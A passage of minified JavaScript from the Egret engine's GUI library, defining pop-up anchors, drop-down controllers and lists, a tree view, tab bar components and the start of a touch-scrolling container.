i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._displayPopUp=this._popUpWidthMatchesAnchorWidth=this._popUpHeightMatchesAnchorHeight=this.addedToStage=this.popUpIsDisplayed=!1,this._popUpPosition=e.PopUpPosition.TOP_LEFT,this.inAnimation=!1,this.animator=null,this._openDuration=250,this._closeDuration=150,this.valueRange=1,this.addEventListener(t.Event.ADDED_TO_STAGE,this.addedToStageHandler,this),this.addEventListener(t.Event.REMOVED_FROM_STAGE,this.removedFromStageHandler,this)}return __extends(n,i),Object.defineProperty(n.prototype,"popUpHeightMatchesAnchorHeight",{get:function(){return this._popUpHeightMatchesAnchorHeight},set:function(t){this._popUpHeightMatchesAnchorHeight!=t&&(this._popUpHeightMatchesAnchorHeight=t,this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"popUpWidthMatchesAnchorWidth",{get:function(){return this._popUpWidthMatchesAnchorWidth},set:function(t){this._popUpWidthMatchesAnchorWidth!=t&&(this._popUpWidthMatchesAnchorWidth=t,this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"displayPopUp",{get:function(){return this._displayPopUp},set:function(t){this._displayPopUp!=t&&(this._displayPopUp=t,this.addOrRemovePopUp())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"popUp",{get:function(){return this._popUp},set:function(t){this._popUp!=t&&(this._popUp=t,this.dispatchEventWith("popUpChanged"))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"popUpPosition",{get:function(){return this._popUpPosition},set:function(t){this._popUpPosition!=t&&(this._popUpPosition=t,this.invalidateDisplayList())},enumerable:!0,configurable:!0}),n.prototype.updateDisplayList=function(t,e){i.prototype.updateDisplayList.call(this,t,e),this.applyPopUpTransform(t,e)},n.prototype.updatePopUpTransform=function(){this.applyPopUpTransform(this.width,this.height)},n.prototype.calculatePopUpPosition=function(){var i=t.Point.identity;switch(this._popUpPosition){case e.PopUpPosition.BELOW:i.x=0,i.y=this.height;break;case e.PopUpPosition.ABOVE:i.x=0,i.y=-this.popUp.layoutBoundsHeight;break;case e.PopUpPosition.LEFT:i.x=-this.popUp.layoutBoundsWidth,i.y=0;break;case e.PopUpPosition.RIGHT:i.x=this.width,i.y=0;break;case e.PopUpPosition.CENTER:i.x=.5*(this.width-this.popUp.layoutBoundsWidth),i.y=.5*(this.height-this.popUp.layoutBoundsHeight)}return i=this.localToGlobal(i.x,i.y,i),i=this.popUp.parent.globalToLocal(i.x,i.y,i)},Object.defineProperty(n.prototype,"openDuration",{get:function(){return this._openDuration},set:function(t){this._openDuration=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"closeDuration",{get:function(){return this._closeDuration},set:function(t){this._closeDuration=t},enumerable:!0,configurable:!0}),n.prototype.animationStartHandler=function(t){this.inAnimation=!0,this.popUp&&"enabled"in this.popUp&&(this.popUp.enabled=!1)},n.prototype.animationUpdateHandler=function(e){var i=this.popUp._scrollRect,n=Math.round(e.currentValue.x);e=Math.round(e.currentValue.y),i?(i.x=n,i.y=e,i.width=this.popUp.width,i.height=this.popUp.height):this.popUp._scrollRect=new t.Rectangle(n,e,this.popUp.width,this.popUp.height)},n.prototype.animationEndHandler=function(t){this.inAnimation=!1,this.popUp&&"enabled"in this.popUp&&(this.popUp.enabled=!0),this.popUp.scrollRect=null,this.popUpIsDisplayed||(e.PopUpManager.removePopUp(this.popUp),this.popUp.ownerChanged(null))},n.prototype.addOrRemovePopUp=function(){this.addedToStage&&this.popUp&&(null==this.popUp.parent&&this.displayPopUp?(e.PopUpManager.addPopUp(this.popUp,!1,!1),this.popUp.ownerChanged(this),this.popUpIsDisplayed=!0,this.inAnimation&&this.animator.end(),this.initialized?(this.applyPopUpTransform(this.width,this.height),0<this._openDuration&&this.startAnimation()):t.callLater(function(){0<this.openDuration&&this.startAnimation()},this)):null==this.popUp.parent||this.displayPopUp||this.removeAndResetPopUp())},n.prototype.removeAndResetPopUp=function(){this.inAnimation&&this.animator.end(),this.popUpIsDisplayed=!1,0<this._closeDuration?this.startAnimation():(e.PopUpManager.removePopUp(this.popUp),this.popUp.ownerChanged(null))},n.prototype.applyPopUpTransform=function(t,e){if(this.popUpIsDisplayed){this.popUpWidthMatchesAnchorWidth&&(this.popUp.width=t),this.popUpHeightMatchesAnchorHeight&&(this.popUp.height=e),"validateNow"in this.popUp&&this.popUp.validateNow();var i=this.calculatePopUpPosition();this.popUp.x=i.x,this.popUp.y=i.y}},n.prototype.startAnimation=function(){this.animator||(this.animator=new e.Animation(this.animationUpdateHandler,this),this.animator.endFunction=this.animationEndHandler,this.animator.startFunction=this.animationStartHandler),this.animator.motionPaths=this.createMotionPath(),this.animator.duration=this.popUpIsDisplayed?this._openDuration:this._closeDuration,this.animator.play()},n.prototype.createMotionPath=function(){var t={prop:"x"},i={prop:"y"},n=[t,i];switch(this._popUpPosition){case e.PopUpPosition.TOP_LEFT:case e.PopUpPosition.CENTER:case e.PopUpPosition.BELOW:t.from=t.to=0,i.from=this.popUp.height,i.to=0,this.valueRange=this.popUp.height;break;case e.PopUpPosition.ABOVE:t.from=t.to=0,i.from=-this.popUp.height,i.to=0,this.valueRange=this.popUp.height;break;case e.PopUpPosition.LEFT:i.from=i.to=0,t.from=-this.popUp.width,t.to=0,this.valueRange=this.popUp.width;break;case e.PopUpPosition.RIGHT:i.from=i.to=0,t.from=this.popUp.width,t.to=0,this.valueRange=this.popUp.width;break;default:this.valueRange=1}if(this.valueRange=Math.abs(this.valueRange),!this.popUpIsDisplayed){var r=t.from;t.from=t.to,t.to=r,r=i.from,i.from=i.to,i.to=r}return n},n.prototype.addedToStageHandler=function(e){this.addedToStage=!0,t.callLater(this.checkPopUpState,this)},n.prototype.checkPopUpState=function(){this.addedToStage?this.addOrRemovePopUp():null!=this.popUp&&null!=this.popUp.parent&&this.removeAndResetPopUp()},n.prototype.removedFromStageHandler=function(e){this.addedToStage=!1,t.callLater(this.checkPopUpState,this)},n}(e.UIComponent);e.PopUpAnchor=i,i.prototype.__class__="egret.gui.PopUpAnchor"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._isOpen=!1,this._closeOnResize=!0,this._rollOverOpenDelay=NaN}return __extends(n,i),Object.defineProperty(n.prototype,"openButton",{get:function(){return this._openButton},set:function(t){this._openButton!==t&&(this.removeOpenTriggers(),this._openButton=t,this.addOpenTriggers())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"dropDown",{get:function(){return this._dropDown},set:function(t){this._dropDown!==t&&(this._dropDown=t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"isOpen",{get:function(){return this._isOpen},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"closeOnResize",{get:function(){return this._closeOnResize},set:function(t){this._closeOnResize!=t&&(this.isOpen&&this.removeCloseOnResizeTrigger(),this._closeOnResize=t,this.addCloseOnResizeTrigger())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"rollOverOpenDelay",{get:function(){return this._rollOverOpenDelay},set:function(t){this._rollOverOpenDelay!=t&&(this.removeOpenTriggers(),this._rollOverOpenDelay=t,this.addOpenTriggers())},enumerable:!0,configurable:!0}),n.prototype.addOpenTriggers=function(){this.openButton&&(isNaN(this.rollOverOpenDelay)?this.openButton.addEventListener(e.UIEvent.BUTTON_DOWN,this._openButton_buttonDownHandler,this):this.openButton.addEventListener(t.TouchEvent.TOUCH_ROLL_OVER,this._openButton_rollOverHandler,this))},n.prototype.removeOpenTriggers=function(){this.openButton&&(isNaN(this.rollOverOpenDelay)?this.openButton.removeEventListener(e.UIEvent.BUTTON_DOWN,this._openButton_buttonDownHandler,this):this.openButton.removeEventListener(t.TouchEvent.TOUCH_ROLL_OVER,this._openButton_rollOverHandler,this))},n.prototype.addCloseTriggers=function(){e.UIGlobals.stage&&(isNaN(this.rollOverOpenDelay)?(e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.stage_mouseDownHandler,this),e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpHandler_noRollOverOpenDelay,this)):e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_MOVE,this.stage_mouseMoveHandler,this),this.addCloseOnResizeTrigger())},n.prototype.removeCloseTriggers=function(){e.UIGlobals.stage&&(isNaN(this.rollOverOpenDelay)?(e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_BEGIN,this.stage_mouseDownHandler,this),e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpHandler_noRollOverOpenDelay,this)):(e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_MOVE,this.stage_mouseMoveHandler,this),e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpHandler,this),e.UIGlobals.stage.removeEventListener(t.Event.LEAVE_STAGE,this.stage_mouseUpHandler,this)),this.removeCloseOnResizeTrigger())},n.prototype.addCloseOnResizeTrigger=function(){this.closeOnResize&&e.UIGlobals.stage.addEventListener(t.Event.RESIZE,this.stage_resizeHandler,this)},n.prototype.removeCloseOnResizeTrigger=function(){this.closeOnResize&&e.UIGlobals.stage.removeEventListener(t.Event.RESIZE,this.stage_resizeHandler,this)},n.prototype.isTargetOverDropDownOrOpenButton=function(e){if(e){if(this.openButton&&this.openButton.contains(e))return!0;if(null!=this.hitAreaAdditions)for(var i=0;i<this.hitAreaAdditions.length;i++)if(this.hitAreaAdditions[i]==e||this.hitAreaAdditions[i]instanceof t.DisplayObjectContainer&&this.hitAreaAdditions[i].contains(e))return!0;if(this.dropDown instanceof t.DisplayObjectContainer){if(this.dropDown.contains(e))return!0}else if(e==this.dropDown)return!0}return!1},n.prototype.openDropDown=function(){this.openDropDownHelper()},n.prototype.openDropDownHelper=function(){this.isOpen||(this.addCloseTriggers(),this._isOpen=!0,this.openButton&&this.openButton._setKeepDown(!0),e.UIEvent.dispatchUIEvent(this,e.UIEvent.OPEN))},n.prototype.closeDropDown=function(t){if(this.isOpen){this._isOpen=!1,this.openButton&&this.openButton._setKeepDown(!1);var i=new e.UIEvent(e.UIEvent.CLOSE,!1,!0);t||i.preventDefault(),this.dispatchEvent(i),this.removeCloseTriggers()}},n.prototype._openButton_buttonDownHandler=function(t){this.isOpen?this.closeDropDown(!0):(this.mouseIsDown=!0,this.openDropDownHelper())},n.prototype._openButton_rollOverHandler=function(e){0==this.rollOverOpenDelay?this.openDropDownHelper():(this.openButton.addEventListener(t.TouchEvent.TOUCH_ROLL_OUT,this.openButton_rollOutHandler,this),this.rollOverOpenDelayTimer=new t.Timer(this.rollOverOpenDelay,1),this.rollOverOpenDelayTimer.addEventListener(t.TimerEvent.TIMER_COMPLETE,this.rollOverDelay_timerCompleteHandler,this),this.rollOverOpenDelayTimer.start())},n.prototype.openButton_rollOutHandler=function(e){this.rollOverOpenDelayTimer&&this.rollOverOpenDelayTimer.running&&(this.rollOverOpenDelayTimer.stop(),this.rollOverOpenDelayTimer=null),this.openButton.removeEventListener(t.TouchEvent.TOUCH_ROLL_OUT,this.openButton_rollOutHandler,this)},n.prototype.rollOverDelay_timerCompleteHandler=function(e){this.openButton.removeEventListener(t.TouchEvent.TOUCH_ROLL_OUT,this.openButton_rollOutHandler,this),this.rollOverOpenDelayTimer=null,this.openDropDownHelper()},n.prototype.stage_mouseDownHandler=function(e){if(this.mouseIsDown)this.mouseIsDown=!1;else if(!this.dropDown||this.dropDown&&(e.target==this.dropDown||this.dropDown instanceof t.DisplayObjectContainer&&!this.dropDown.contains(e.target))){var i=e.target;if(!(this.openButton&&i&&this.openButton.contains(i))){if(null!=this.hitAreaAdditions)for(i=0;i<this.hitAreaAdditions.length;i++)if(this.hitAreaAdditions[i]==e.target||this.hitAreaAdditions[i]instanceof t.DisplayObjectContainer&&this.hitAreaAdditions[i].contains(e.target))return;this.closeDropDown(!0)}}},n.prototype.stage_mouseMoveHandler=function(i){this.isTargetOverDropDownOrOpenButton(i.target)||(i instanceof t.TouchEvent&&i.touchDown?(e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpHandler,this),e.UIGlobals.stage.addEventListener(t.Event.LEAVE_STAGE,this.stage_mouseUpHandler,this)):this.closeDropDown(!0))},n.prototype.stage_mouseUpHandler_noRollOverOpenDelay=function(t){this.mouseIsDown&&(this.mouseIsDown=!1)},n.prototype.stage_mouseUpHandler=function(i){this.isTargetOverDropDownOrOpenButton(i.target)?(e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpHandler,this),e.UIGlobals.stage.removeEventListener(t.Event.LEAVE_STAGE,this.stage_mouseUpHandler,this)):this.closeDropDown(!0)},n.prototype.stage_resizeHandler=function(t){this.closeDropDown(!0)},n.prototype.stage_mouseWheelHandler=function(t){!this.dropDown||this.dropDown.contains(t.target)&&t.isDefaultPrevented()||this.closeDropDown(!1)},n}(t.EventDispatcher);e.DropDownController=i,i.prototype.__class__="egret.gui.DropDownController"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(e){function i(){e.call(this),this._labelChanged=!1,this._userProposedSelectedIndex=t.ListBase.NO_SELECTION,this._captureItemRenderer=!1,this.dropDownController=new t.DropDownController}return __extends(i,e),i.prototype._setDataProvider=function(t){this.dataProvider!==t&&(e.prototype._setDataProvider.call(this,t),this._labelChanged=!0,this.invalidateProperties())},i.prototype._setLabelField=function(t){this.labelField!=t&&(e.prototype._setLabelField.call(this,t),this._labelChanged=!0,this.invalidateProperties())},i.prototype._setLabelFunction=function(t){this.labelFunction!=t&&(e.prototype._setLabelFunction.call(this,t),this._labelChanged=!0,this.invalidateProperties())},Object.defineProperty(i.prototype,"dropDownController",{get:function(){return this._dropDownController},set:function(e){this._dropDownController!=e&&(this._dropDownController=e,this._dropDownController.addEventListener(t.UIEvent.OPEN,this._dropDownController_openHandler,this),this._dropDownController.addEventListener(t.UIEvent.CLOSE,this.dropDownController_closeHandler,this),this.openButton&&(this._dropDownController.openButton=this.openButton),this.dropDown&&(this._dropDownController.dropDown=this.dropDown))},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"isDropDownOpen",{get:function(){return!!this.dropDownController&&this.dropDownController.isOpen},enumerable:!0,configurable:!0}),i.prototype.commitProperties=function(){e.prototype.commitProperties.call(this),this._labelChanged&&(this._labelChanged=!1,this.updateLabelDisplay())},i.prototype.partAdded=function(t,i){e.prototype.partAdded.call(this,t,i),i==this.openButton?this.dropDownController&&(this.dropDownController.openButton=this.openButton):i==this.dropDown&&this.dropDownController&&(this.dropDownController.dropDown=this.dropDown)},i.prototype.partRemoved=function(t,i){this.dropDownController&&(i==this.openButton&&(this.dropDownController.openButton=null),i==this.dropDown&&(this.dropDownController.dropDown=null)),e.prototype.partRemoved.call(this,t,i)},i.prototype.getCurrentSkinState=function(){return this.enabled?this.isDropDownOpen?"open":"normal":"disabled"},i.prototype.commitSelection=function(t){return void 0===t&&(t=!0),t=e.prototype.commitSelection.call(this,t),this.updateLabelDisplay(),t},i.prototype._isItemIndexSelected=function(t){return this._userProposedSelectedIndex==t},i.prototype.openDropDown=function(){this.dropDownController.openDropDown()},i.prototype.closeDropDown=function(t){this.dropDownController.closeDropDown(t)},i.prototype.updateLabelDisplay=function(t){},i.prototype._changeHighlightedSelection=function(t,e){this.itemSelected(this._userProposedSelectedIndex,!1),this._userProposedSelectedIndex=t,this.itemSelected(this._userProposedSelectedIndex,!0)},i.prototype.dataProvider_collectionChangeHandler=function(t){e.prototype.dataProvider_collectionChangeHandler.call(this,t),this._labelChanged=!0,this.invalidateProperties()},i.prototype.item_mouseDownHandler=function(i){e.prototype.item_mouseDownHandler.call(this,i),this._dispatchListEvent(i,t.ListEvent.ITEM_CLICK,i.currentTarget),this._userProposedSelectedIndex=this.selectedIndex,this.closeDropDown(!0)},i.prototype._dropDownController_openHandler=function(e){this.addEventListener(t.UIEvent.UPDATE_COMPLETE,this._open_updateCompleteHandler,this),this._userProposedSelectedIndex=this.selectedIndex,this.invalidateSkinState()},i.prototype._open_updateCompleteHandler=function(e){this.removeEventListener(t.UIEvent.UPDATE_COMPLETE,this._open_updateCompleteHandler,this),t.UIEvent.dispatchUIEvent(this,t.UIEvent.OPEN)},i.prototype.dropDownController_closeHandler=function(e){this.addEventListener(t.UIEvent.UPDATE_COMPLETE,this.close_updateCompleteHandler,this),this.invalidateSkinState(),e.isDefaultPrevented()?this._changeHighlightedSelection(this.selectedIndex):this._setSelectedIndex(this._userProposedSelectedIndex,!0)},i.prototype.close_updateCompleteHandler=function(e){this.removeEventListener(t.UIEvent.UPDATE_COMPLETE,this.close_updateCompleteHandler,this),t.UIEvent.dispatchUIEvent(this,t.UIEvent.CLOSE)},i.PAGE_SIZE=5,i}(t.List);t.DropDownListBase=e,e.prototype.__class__="egret.gui.DropDownListBase"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(e){function i(){e.call(this),this.iconFieldOrFunctionChanged=!1,this.hostComponentKey="egret.gui.Tree"}return __extends(i,e),i.prototype.createChildren=function(){this.itemRenderer||(this.itemRenderer=i.defaultTreeRendererFactory),e.prototype.createChildren.call(this)},i.prototype.updateRenderer=function(t,i,n){if("hasChildren"in t&&"hasChildren"in this.dataProvider){var r=this.dataProvider;t.hasChildren=r.hasChildren(n),t.opened=r.isItemOpen(n),t.depth=r.getDepth(n),t.iconSkinName=this.itemToIcon(n)}return e.prototype.updateRenderer.call(this,t,i,n)},i.prototype.itemToIcon=function(t){if(!t)return null;if(null!=this._iconFunction)return this._iconFunction(t);var e;if(t instanceof Object)try{t[this.iconField]&&(e=t[this.iconField])}catch(t){}return e},i.prototype.dataGroup_rendererAddHandler=function(i){e.prototype.dataGroup_rendererAddHandler.call(this,i),i.renderer&&"hasChildren"in i.renderer&&i.renderer.addEventListener(t.TreeEvent.ITEM_OPENING,this.onItemOpening,this)},i.prototype.onItemOpening=function(e){var i=e.itemRenderer,n=e.item,r=this._getDataProvider();i&&r&&"hasChildren"in r&&this.dispatchEvent(e)&&(e=!i.opened,r.expandItem(n,e),t.TreeEvent.dispatchTreeEvent(this,e?t.TreeEvent.ITEM_OPEN:t.TreeEvent.ITEM_CLOSE,i.itemIndex,n,i))},i.prototype.dataGroup_rendererRemoveHandler=function(i){e.prototype.dataGroup_rendererRemoveHandler.call(this,i),i.renderer&&"hasChildren"in i.renderer&&i.renderer.removeEventListener(t.TreeEvent.ITEM_OPENING,this.onItemOpening,this)},Object.defineProperty(i.prototype,"iconField",{get:function(){return this._iconField},set:function(t){this._iconField!=t&&(this._iconField=t,this.iconFieldOrFunctionChanged=!0,this.invalidateProperties())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"iconFunction",{get:function(){return this._iconFunction},set:function(t){this._iconFunction!=t&&(this._iconFunction=t,this.iconFieldOrFunctionChanged=!0,this.invalidateProperties())},enumerable:!0,configurable:!0}),i.prototype.expandItem=function(t,e){void 0===e&&(e=!0);var i=this._getDataProvider();i&&"hasChildren"in i&&i.expandItem(t,e)},i.prototype.isItemOpen=function(t){var e=this._getDataProvider();return!!(e&&"hasChildren"in e)&&e.isItemOpen(t)},i.prototype.dataProvider_collectionChangeHandler=function(i){if(e.prototype.dataProvider_collectionChangeHandler.call(this,i),i.kind==t.CollectionEventKind.OPEN||i.kind==t.CollectionEventKind.CLOSE){var n=this.dataGroup?this.dataGroup.getElementAt(i.location):null;n&&(this.updateRenderer(n,i.location,i.items[0]),i.kind==t.CollectionEventKind.CLOSE&&this.layout&&this.layout.useVirtualLayout&&(this.layout.clearVirtualLayoutCache(),this.invalidateSize()))}},i.prototype.commitProperties=function(){if(e.prototype.commitProperties.call(this),this.iconFieldOrFunctionChanged){if(null!=this.dataGroup){var t;if(this.layout&&this.layout.useVirtualLayout)for(var i=this.dataGroup.getElementIndicesInView(),n=i.length,r=0;r<n;r++)t=i[r],this.updateRendererIconProperty(t);else for(i=this.dataGroup.numElements,t=0;t<i;t++)this.updateRendererIconProperty(t)}this.iconFieldOrFunctionChanged=!1}},i.prototype.updateRendererIconProperty=function(t){(t=this.dataGroup.getElementAt(t))&&(t.iconSkinName=this.itemToIcon(t.data))},i.defaultTreeRendererFactory=new t.ClassFactory(t.TreeItemRenderer),i}(t.List);t.Tree=e,e.prototype.__class__="egret.gui.Tree"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(t){function e(){t.call(this),this._prompt="",this.hostComponentKey="egret.gui.DropDownList"}return __extends(e,t),Object.defineProperty(e.prototype,"prompt",{get:function(){return this._prompt},set:function(t){this._prompt!=t&&(this._prompt=t,this._labelChanged=!0,this.invalidateProperties())},enumerable:!0,configurable:!0}),e.prototype.partAdded=function(e,i){t.prototype.partAdded.call(this,e,i),i==this.labelDisplay&&(this._labelChanged=!0,this.invalidateProperties())},e.prototype.updateLabelDisplay=function(t){void 0===t&&(t=void 0),this.labelDisplay&&(void 0==t&&(t=this.selectedItem),this.labelDisplay.text=null!=t&&void 0!=t?this.itemToLabel(t):this._prompt)},e}(t.DropDownListBase);t.DropDownList=e,e.prototype.__class__="egret.gui.DropDownList"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(t){function e(){t.call(this),this._allowDeselection=!0,this.hostComponentKey="egret.gui.TabBarButton"}return __extends(e,t),Object.defineProperty(e.prototype,"allowDeselection",{get:function(){return this._allowDeselection},set:function(t){this._allowDeselection=t},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"data",{get:function(){return this._data},set:function(t){this._data=t,this.dispatchEventWith("dataChange")},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"itemIndex",{get:function(){return this._itemIndex},set:function(t){this._itemIndex=t},enumerable:!0,configurable:!0}),e.prototype._setLabel=function(e){e!=this._getLabel()&&(t.prototype._setLabel.call(this,e),this.labelDisplay&&(this.labelDisplay.text=this._getLabel()))},e.prototype.buttonReleased=function(){this.selected&&!this.allowDeselection||t.prototype.buttonReleased.call(this)},e}(t.ToggleButtonBase);t.TabBarButton=e,e.prototype.__class__="egret.gui.TabBarButton"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this.hostComponentKey="egret.gui.TabBar",this.requireSelection=!0}return __extends(n,i),n.prototype.c=function(t){t!=this._requireSelection&&(i.prototype._setRequireSelection.call(this,t),this.requireSelectionChanged_tabBar=!0,this.invalidateProperties())},n.prototype._setDataProvider=function(t){this.dataProvider instanceof e.ViewStack&&(this.dataProvider.removeEventListener("IndexChanged",this.onViewStackIndexChange,this),this.removeEventListener(e.IndexChangeEvent.CHANGE,this.onIndexChanged,this)),t instanceof e.ViewStack&&(t.addEventListener("IndexChanged",this.onViewStackIndexChange,this),this.addEventListener(e.IndexChangeEvent.CHANGE,this.onIndexChanged,this)),i.prototype._setDataProvider.call(this,t)},n.prototype.onIndexChanged=function(t){this.dataProvider._setSelectedIndex(t.newIndex,!1)},n.prototype.onViewStackIndexChange=function(t){this._setSelectedIndex(this.dataProvider.selectedIndex,!1)},n.prototype.commitProperties=function(){if(i.prototype.commitProperties.call(this),this.requireSelectionChanged_tabBar&&this.dataGroup){this.requireSelectionChanged_tabBar=!1;for(var t=this.dataGroup.numElements,e=0;e<t;e++){var n=this.dataGroup.getElementAt(e);n&&(n.allowDeselection=!this.requireSelection)}}},n.prototype.dataGroup_rendererAddHandler=function(n){i.prototype.dataGroup_rendererAddHandler.call(this,n),(n=n.renderer)&&(n.addEventListener(t.TouchEvent.TOUCH_TAP,this.item_clickHandler,this),n instanceof e.TabBarButton&&(n.allowDeselection=!this.requireSelection))},n.prototype.dataGroup_rendererRemoveHandler=function(e){i.prototype.dataGroup_rendererRemoveHandler.call(this,e),(e=e.renderer)&&e.removeEventListener(t.TouchEvent.TOUCH_TAP,this.item_clickHandler,this)},n.prototype.item_clickHandler=function(t){var i,n=t.currentTarget;(i=n?n.itemIndex:this.dataGroup.getElementIndex(t.currentTarget))==this.selectedIndex?this.requireSelection||this._setSelectedIndex(e.ListBase.NO_SELECTION,!0):this._setSelectedIndex(i,!0),this._dispatchListEvent(t,e.ListEvent.ITEM_CLICK,n)},n}(e.ListBase);e.TabBar=i,i.prototype.__class__="egret.gui.TabBar"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._horizontalScrollPolicy=this._verticalScrollPolicy="auto",this.ignoreTouchBegin=!1,this._velocityY=this._velocityX=0,this._previousVelocityX=[],this._previousVelocityY=[]}return __extends(n,i),n.prototype.measure=function(){this._viewport&&(this.measuredWidth=this._viewport.preferredWidth,this.measuredHeight=this._viewport.preferredHeight)},n.prototype.updateDisplayList=function(t,e){this._viewport.setLayoutBoundsSize(t,e)},Object.defineProperty(n.prototype,"verticalScrollPolicy",{get:function(){return this._verticalScrollPolicy},set:function(t){this._verticalScrollPolicy=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"horizontalScrollPolicy",{get:function(){return this._horizontalScrollPolicy},set:function(t){this._horizontalScrollPolicy=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"viewport",{get:function(){return this._viewport},set:function(t){t!=this._viewport&&(this.uninstallViewport(),this._viewport=t,this.installViewport(),this.dispatchEventWith("viewportChanged"))},enumerable:!0,configurable:!0}),n.prototype.installViewport=function(){this.viewport&&(this.viewport.clipAndEnableScrolling=!0,this.viewport.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.onTouchBegin,this),this.viewport.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.onTouchBeginCapture,this,!0),this.viewport.addEventListener(t.TouchEvent.TOUCH_END,this.onTouchEndCapture,this,!0),this._addToDisplayListAt(this.viewport,0))},n.prototype.uninstallViewport=function(){this.viewport&&(this.viewport.clipAndEnableScrolling=!1,this.viewport.removeEventListener(t.TouchEvent.TOUCH_BEGIN,this.onTouchBegin,this),this.viewport.removeEventListener(t.TouchEvent.TOUCH_BEGIN,this.onTouchBeginCapture,this,!0),this.viewport.removeEventListener(t.TouchEvent.TOUCH_END,this.onTouchEndCapture,this,!0),this._removeFromDisplayList(this.viewport))},n.prototype.onTouchEndCapture=function(e){this.delayTouchBeginEvent&&(e.stopPropagation(),this.delayTouchEndEvent=this.cloneTouchEvent(e),this.onTouchBeginTimer(),this.touchEndTimer||(this.touchEndTimer=new t.Timer(100,1),this.touchEndTimer.addEventListener(t.TimerEvent.TIMER_COMPLETE,this.onTouchEndTimer,this)),this.touchEndTimer.start())},n.prototype.onTouchEndTimer=function(t){this.touchEndTimer.stop(),t=this.delayTouchEndEvent,this.delayTouchEndEvent=null,this.dispatchPropagationEvent(t)},n.prototype.dispatchPropagationEvent=function(t){for(var e=[],i=t._target;i;)e.push(i),i=i.parent;for(var n=this._viewport,r=1;(i=e[r])&&i!==n;r+=2)e.unshift(i);i=e.indexOf(t._target),this._dispatchPropagationEvent(t,e,i)},n.prototype.onTouchBeginCapture=function(e){var i=this.checkScrollPolicy();if(i){for(var r=e.target;r!=this;){if(r instanceof n&&(i=r.checkScrollPolicy()))return;r=r.parent}this.delayTouchEndEvent&&(this.delayTouchEndEvent=null,this.touchEndTimer.stop()),e.stopPropagation(),this.delayTouchBeginEvent=this.cloneTouchEvent(e),this.touchBeginTimer||(this.touchBeginTimer=new t.Timer(100,1),this.touchBeginTimer.addEventListener(t.TimerEvent.TIMER_COMPLETE,this.onTouchBeginTimer,this)),this.touchBeginTimer.start(),this.onTouchBegin(e)}},n.prototype.cloneTouchEvent=function(e){var i=new t.TouchEvent(e._type,e._bubbles,e.cancelable);return i.touchPointID=e.touchPointID,i._stageX=e._stageX,i._stageY=e._stageY,i.ctrlKey=e.ctrlKey,i.altKey=e.altKey,i.shiftKey=e.shiftKey,i.touchDown=e.touchDown,i._isDefaultPrevented=!1,i._target=e._target,i},n.prototype.onTouchBeginTimer=function(t){this.touchBeginTimer.stop(),t=this.delayTouchBeginEvent,this.delayTouchBeginEvent=null,this.dispatchPropagationEvent(t)},n.prototype.checkScrollPolicy=function(){var t,e=this._viewport;switch(this._horizontalScrollPolicy){case"auto":t=e.contentWidth>e.width;break;case"on":t=!0;break;case"off":t=!1}this._horizontalCanScroll=t;var i;switch(this._verticalScrollPolicy){case"auto":i=e.contentHeight>e.height;break;case"on":i=!0;break;case"off":i=!1}return 